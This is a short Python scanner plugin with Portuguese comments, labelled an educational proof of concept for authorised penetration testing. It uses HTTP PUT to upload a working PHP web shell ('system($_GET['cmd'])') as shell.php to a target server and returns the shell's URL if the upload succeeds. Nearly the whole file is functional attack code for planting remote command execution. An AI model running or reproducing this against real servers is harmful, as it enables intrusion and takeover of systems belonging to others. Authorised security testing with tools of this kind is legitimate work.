# plugins/fast_webshell.py
def run(target, ip, open_ports, banners):
    """
    [PoC EDUCACIONAL] Tenta fazer upload de uma webshell PHP via HTTP PUT.
    ATENÇÃO: Este plugin é exclusivamente para testes de penetração autorizados.
    Retorna URL caso sucesso, ou erro.
    """
    import requests

    resultado = {}
    try:
        payload = "<?php system($_GET['cmd']); ?>"
        url = f"http://{target}/shell.php"
        r = requests.put(url, data=payload, timeout=6)
        if r.status_code in [200, 201, 204]:
            resultado["status"] = "vulneravel"
            resultado["url"] = url
            resultado["aviso"] = "PUT method aceito — possível upload de webshell!"
        else:
            resultado["status"] = "seguro"
            resultado["mensagem"] = f"PUT rejeitado (HTTP {r.status_code})"
    except requests.Timeout:
        resultado["erro"] = "Timeout na conexão"
    except Exception as e:
        resultado["erro"] = str(e)

    return {"plugin": "fast_webshell", "resultados": resultado}
